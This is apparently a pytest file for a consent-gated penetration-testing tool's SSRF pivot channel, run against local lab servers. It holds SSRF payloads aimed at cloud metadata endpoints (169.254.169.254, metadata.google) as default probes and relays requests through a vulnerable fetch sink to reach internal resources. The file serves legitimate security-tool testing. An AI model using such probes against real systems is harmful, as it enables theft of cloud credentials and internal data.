"""S4 tests — SSRF pivot/relay exploitation channel.

Covers the planner (consent gate, evidence capture), the relay helper
(reflection-strip so a mirroring server can't fake a fetch), the finding
filter, the engine seam import, and the REPL /pivot command. Uses real aiohttp
lab servers as the SSRF sink + an internal target, exactly like test_exploit
does for the RCE planner.
"""

import asyncio
import json
from pathlib import Path
from urllib.parse import urlparse

import pytest
from aiohttp import ClientSession, web

from titan.core.models import AttackType, Finding, Severity
from titan.exploit.consent import ConsentError, create_consent, write_consent
from titan.exploit.repl import SessionREPL
from titan.exploit.session import SessionStore
from titan.exploit.ssrfpivot import (
    PivotError,
    relay_through_sink,
    ssrf_pivot,
    usable_ssrf_findings,
)


def _ssrf_finding(url: str, param: str = "url") -> Finding:
    return Finding(
        target="http://lab.local",
        url=url,
        method="GET",
        param=param,
        location="query",
        payload="http://169.254.169.254/latest/meta-data/",
        attack_type=AttackType.SSRF,
        severity=Severity.CRITICAL,
        verified=True,
        confidence=0.95,
        diffs=["ssrf:content:meta-data"],
    )


@pytest.fixture
async def lab_pair(tmp_path):
    """A real SSRF sink + an internal-only target the sink can reach.

    sink:  /fetch?url=<probe>  — fetches the probe URL and returns its body
                                 (the vulnerable primitive the scanner found).
    inner: /secret            — the "internal" resource, unreachable from the
                                 test but reachable through the sink.
    Returns (sink_url, inner_url, ports) with both apps running.
    """
    async def handle_inner(request: web.Request) -> web.Response:
        return web.Response(text="ami-id: i-0123abcd\nroot: x:0:0:root:/root:/bin/bash")

    inner_app = web.Application()
    inner_app.router.add_get("/secret", handle_inner)
    inner_runner = web.AppRunner(inner_app)
    await inner_runner.setup()
    inner_site = web.TCPSite(inner_runner, "127.0.0.1", 0)
    await inner_site.start()
    inner_port = inner_site._server.sockets[0].getsockname()[1]  # type: ignore[attr-defined]
    inner_url = f"http://127.0.0.1:{inner_port}/secret"

    async def handle_fetch(request: web.Request) -> web.Response:
        probe = request.query.get("url", "")
        try:
            async with ClientSession() as client:
                async with client.get(probe, timeout=3) as r:
                    return web.Response(text=await r.text(), status=r.status)
        except Exception:
            return web.Response(text="fetch failed", status=502)

    sink_app = web.Application()
    sink_app.router.add_get("/fetch", handle_fetch)
    sink_runner = web.AppRunner(sink_app)
    await sink_runner.setup()
    sink_site = web.TCPSite(sink_runner, "127.0.0.1", 0)
    await sink_site.start()
    sink_port = sink_site._server.sockets[0].getsockname()[1]  # type: ignore[attr-defined]
    sink_url = f"http://127.0.0.1:{sink_port}/fetch"

    yield sink_url, inner_url, sink_port, inner_port

    await sink_runner.cleanup()
    await inner_runner.cleanup()


# ---------------------------------------------------------------------------
# Relay helper
# ---------------------------------------------------------------------------

async def test_relay_through_sink_captures_internal_content(lab_pair):
    sink_url, inner_url, _, _ = lab_pair
    finding = _ssrf_finding(sink_url)
    result = await relay_through_sink(finding, inner_url)
    assert result["status"] == 200
    assert "ami-id" in result["body"]
    assert "i-0123abcd" in result["body"]
    # Content markers come from the CAPTURED body, not the probe URL's own
    # string (the URL /secret carries no cloud metadata vocabulary).
    assert "ami-id" in result["content_markers"]
    assert "meta-data" not in result["content_markers"]


async def test_relay_reflection_never_verifies(lab_pair):
    """A sink that merely echoes the probe URL back must NOT produce markers:
    the URL string itself contains 'meta-data'/'169.254' — the strip must
    remove it in every encoding before markers are matched."""
    sink_url, inner_url, _, _ = lab_pair
    # Echo sink: returns the probe URL verbatim (server reflects the param).
    async def handle_echo(request: web.Request) -> web.Response:
        return web.Response(text=request.query.get("url", ""))

    app = web.Application()
    app.router.add_get("/echo", handle_echo)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]  # type: ignore[attr-defined]
    try:
        result = await relay_through_sink(
            _ssrf_finding(f"http://127.0.0.1:{port}/echo"), inner_url
        )
        # The fetch itself "succeeded" (HTTP 200 echo) but there is NO
        # evidence the sink fetched the inner URL — content markers stay empty.
        assert result["status"] == 200
        assert result["content_markers"] == []
    finally:
        await runner.cleanup()


async def test_relay_inner_unreachable_serves_no_markers(lab_pair):
    """The sink is working but the probe target is unreachable: the relay
    captures the sink's own error page (HTTP 200, no markers) — never a
    fake success and never a crash."""
    sink_url, _, _, _ = lab_pair
    finding = _ssrf_finding(sink_url)
    result = await relay_through_sink(finding, "http://127.0.0.1:1/nope")
    # The sink's own error page (502, no markers) is captured faithfully.
    assert result["status"] == 502
    assert result["content_markers"] == []


async def test_relay_dead_sink_raises():
    """A sink that cannot be reached AT ALL surfaces as PivotError."""
    finding = _ssrf_finding("http://127.0.0.1:1/fetch")
    with pytest.raises(PivotError):
        await relay_through_sink(finding, "http://169.254.169.254/latest/meta-data/")


# ---------------------------------------------------------------------------
# Planner
# ---------------------------------------------------------------------------

async def test_ssrf_pivot_requires_consent(tmp_path: Path, lab_pair):
    sink_url, inner_url, _, _ = lab_pair
    with pytest.raises(ConsentError, match="no consent"):
        await ssrf_pivot(
            _ssrf_finding(sink_url),
            "http://lab.local",
            probes=[inner_url],
            consent_dir=tmp_path / "consent",
            output_dir=tmp_path / "findings",
        )


async def test_ssrf_pivot_end_to_end(tmp_path: Path, lab_pair):
    sink_url, inner_url, _, _ = lab_pair
    key = tmp_path / "k.pem"
    doc = create_consent("http://lab.local", expiry="1h", key_path=key)
    write_consent(doc, consent_dir=tmp_path / "consent")

    store = await ssrf_pivot(
        _ssrf_finding(sink_url),
        "http://lab.local",
        probes=[inner_url],
        consent_dir=tmp_path / "consent",
        output_dir=tmp_path / "findings",
        key_path=key,
    )
    meta = store.read_meta()
    assert meta["channel"] == "ssrf-pivot"
    assert meta["target"] == "http://lab.local"
    assert meta["pivot"]["responses"] == 1
    assert meta["pivot"]["failures"] == 0
    # Evidence artifact holds the captured internal content.
    samples = list(store.samples_dir.glob("ssrf_pivot_*.json"))
    assert samples, "no pivot sample saved"
    data = json.loads(samples[0].read_text(encoding="utf-8"))
    assert "ami-id" in data["body"]
    assert data["status"] == 200
    # Transcript proves the relay event.
    assert "SSRF pivot via" in store.transcript_path.read_text(encoding="utf-8")


async def test_ssrf_pivot_default_probes_are_metadata(lab_pair):
    """Without explicit probes, the planner uses the cloud metadata set."""
    from titan.exploit.ssrfpivot import DEFAULT_PROBES

    assert any("169.254.169.254" in p for p in DEFAULT_PROBES)
    assert any("metadata.google" in p for p in DEFAULT_PROBES)


def test_usable_ssrf_findings_filters():
    good = _ssrf_finding("http://lab.local/fetch?url=x")
    bad_unverified = _ssrf_finding("http://lab.local/fetch?url=x")
    bad_unverified.verified = False
    bad_type = _ssrf_finding("http://lab.local/fetch?url=x")
    bad_type.attack_type = AttackType.SQLI
    out = usable_ssrf_findings([good, bad_unverified, bad_type], "http://lab.local")
    assert out == [good]


# ---------------------------------------------------------------------------
# REPL /pivot
# ---------------------------------------------------------------------------

async def test_repl_pivot_saves_sample(tmp_path: Path, lab_pair):
    sink_url, inner_url, _, _ = lab_pair
    key = tmp_path / "k.pem"
    doc = create_consent("http://lab.local", expiry="1h", key_path=key)
    write_consent(doc, consent_dir=tmp_path / "consent")

    store = await ssrf_pivot(
        _ssrf_finding(sink_url),
        "http://lab.local",
        probes=[inner_url],
        consent_dir=tmp_path / "consent",
        output_dir=tmp_path / "findings",
        key_path=key,
    )
    before = len(list(store.samples_dir.glob("ssrf_pivot_*.json")))

    # Stub REPL over the real session dir; /pivot hits the live sink with a
    # DISTINCT probe URL so it adds a new sample instead of overwriting the
    # planner's (same-name) artifact.
    other = inner_url + "?region=eu"  # still served by the sink's fetch
    inputs = iter(["exit"])
    repl = SessionREPL(
        store.session_id,
        None,  # no job queue for a data session
        session_dir=store.dir,
        read=lambda _: next(inputs),
        wait_result=None,
    )
    assert repl.channel == "ssrf-pivot"
    await repl._handle_pivot([other])

    after = sorted(store.samples_dir.glob("ssrf_pivot_*.json"))
    assert len(after) == before + 1
    # Transcript records the REPL relay.
    assert "REPL pivot" in store.transcript_path.read_text(encoding="utf-8")


async def test_repl_pivot_rejects_non_ssrf_session(tmp_path: Path):
    session_dir = tmp_path / "findings" / "lab-local" / "sessions" / "s-1"
    session_dir.mkdir(parents=True)
    store = SessionStore(session_dir.parent, session_id="s-1")
    store.init_meta("http://lab.local", "sqli-extraction", "consent/lab-local.json")

    repl = SessionREPL("s-1", None, session_dir=session_dir, read=lambda _: "exit", wait_result=None)
    assert repl.channel == "sqli-extraction"
    await repl._handle_pivot(["http://inner/x"])
    # No samples were written by the rejected call.
    assert list(store.samples_dir.glob("ssrf_pivot_*.json")) == []


# ---------------------------------------------------------------------------
# Engine seam (M4 wiring) + CLI one-shot pivot
# ---------------------------------------------------------------------------

def _engine_config(tmp_path: Path) -> dict:
    return {
        "exploit": {
            "enabled": True,
            "consent_dir": str(tmp_path / "consent"),
            "output_dir": str(tmp_path / "findings"),
            "key_path": str(tmp_path / "k.pem"),
            "max_per_type": 2,
            "budget": 60,
            "listener": {"start": False},
        },
        "crawl": {"profile": "fast"},
    }


async def test_engine_seam_stages_ssrf_pivot_with_consent(tmp_path: Path, lab_pair):
    """_run_exploit_modules must turn a verified SSRF finding into an
    ssrf-pivot session when consent exists (mirrors RCE/upload/SQLi wiring)."""
    sink_url, inner_url, _, _ = lab_pair
    # The seam's usable_* filters are host-scoped: the finding URL host must
    # match the scan target host, so target the REAL lab sink, not lab.local.
    host = urlparse(sink_url).netloc
    target = f"http://{host}"
    key = tmp_path / "k.pem"
    doc = create_consent(target, expiry="1h", key_path=key)
    write_consent(doc, consent_dir=tmp_path / "consent")

    from titan.core.engine import TitanEngine
    from titan.core.models import ScanResult

    engine = TitanEngine(_engine_config(tmp_path))
    result = ScanResult(target=target, started_at=0.0, config_snapshot={})
    result.findings = [_ssrf_finding(sink_url)]
    await engine._run_exploit_modules(target, result)

    assert result.exploit_sessions, "SSRF finding was not staged"
    assert any(s["channel"] == "ssrf-pivot" for s in result.exploit_sessions)
    # The relay actually ran against the sink (samples exist).
    session = next(s for s in result.exploit_sessions if s["channel"] == "ssrf-pivot")
    from titan.reporting import site_slug

    store = SessionStore(tmp_path / "findings" / site_slug(target) / "sessions", session_id=session["session_id"])
    samples = list(store.samples_dir.glob("ssrf_pivot_*.json"))
    assert samples, "no pivot samples written by the seam"


async def test_engine_seam_skips_ssrf_without_consent(tmp_path: Path, lab_pair):
    """No consent -> the seam records a skip note, never a session and never
    a thrown exception (the gate degrades quietly)."""
    sink_url, inner_url, _, _ = lab_pair
    from urllib.parse import urlparse as _up

    host = _up(sink_url).netloc
    target = f"http://{host}"
    from titan.core.engine import TitanEngine
    from titan.core.models import ScanResult

    engine = TitanEngine(_engine_config(tmp_path))
    result = ScanResult(target=target, started_at=0.0, config_snapshot={})
    result.findings = [_ssrf_finding(sink_url)]
    await engine._run_exploit_modules(target, result)
    assert result.exploit_sessions == []
    assert any("ssrf" in e for e in result.errors)


async def test_cli_one_shot_pivot(tmp_path: Path, lab_pair):
    """`session <id> pivot <url>` one-shot (no REPL) must resolve the session
    dir correctly and relay through the recorded sink. Regression for the
    session_id bug (parent.name vs session dir name)."""
    import titan_exploit_cli as cli

    sink_url, inner_url, _, _ = lab_pair
    key = tmp_path / "k.pem"
    doc = create_consent("http://lab.local", expiry="1h", key_path=key)
    write_consent(doc, consent_dir=tmp_path / "consent")
    store = await ssrf_pivot(
        _ssrf_finding(sink_url),
        "http://lab.local",
        probes=[inner_url],
        consent_dir=tmp_path / "consent",
        output_dir=tmp_path / "findings",
        key_path=key,
    )
    before = len(list(store.samples_dir.glob("ssrf_pivot_*.json")))

    other = inner_url + "?via=cli"
    code = await cli._pivot_one_shot(store.dir, [other])
    assert code == 0
    after = sorted(store.samples_dir.glob("ssrf_pivot_*.json"))
    assert len(after) == before + 1, "one-shot pivot did not add a sample"
    assert "REPL pivot" in store.transcript_path.read_text(encoding="utf-8")
